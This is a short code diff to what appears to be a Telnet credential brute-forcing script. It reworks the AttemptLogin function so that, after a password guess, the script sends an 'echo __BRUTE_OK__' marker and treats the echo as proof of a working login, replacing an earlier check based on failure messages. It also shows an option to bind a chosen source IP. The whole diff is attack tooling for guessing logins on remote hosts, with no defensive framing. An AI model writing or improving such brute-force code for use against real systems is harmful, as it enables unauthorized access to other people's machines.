@@ -40,7 +40,7 @@ def PrintProgress(total):
         time.sleep(1)
 
 def AttemptLogin(host, port, username, password, sourceIp=None):
-    """Returns True only on real login success."""
+    """Returns True only if marker echo is received."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if sourceIp:
         try:
@@ -57,17 +57,15 @@ def AttemptLogin(host, port, username, password, sourceIp=None):
         tn.read_until(b"Password: ", timeout=3)
         tn.write(password.encode() + b"\n")
 
-        time.sleep(1.5)
-        output = tn.read_very_eager().decode(errors="ignore").lower()
+        # Give server a moment, then send marker
+        time.sleep(1)
+        tn.write(b"echo __BRUTE_OK__\n")
+        time.sleep(0.5)
+
+        out = tn.read_very_eager().decode(errors="ignore")
         tn.close()
 
-        # detect failure messages
-        if "login incorrect" in output or "incorrect" in output or output.strip().endswith("login:"):
-            return False
-
-        # otherwise assume success
-        print(f"\n{GREEN}Success: {username}:{password}{RESET}")
-        return True
+        return "__BRUTE_OK__" in out
 
     except Exception:
         return False
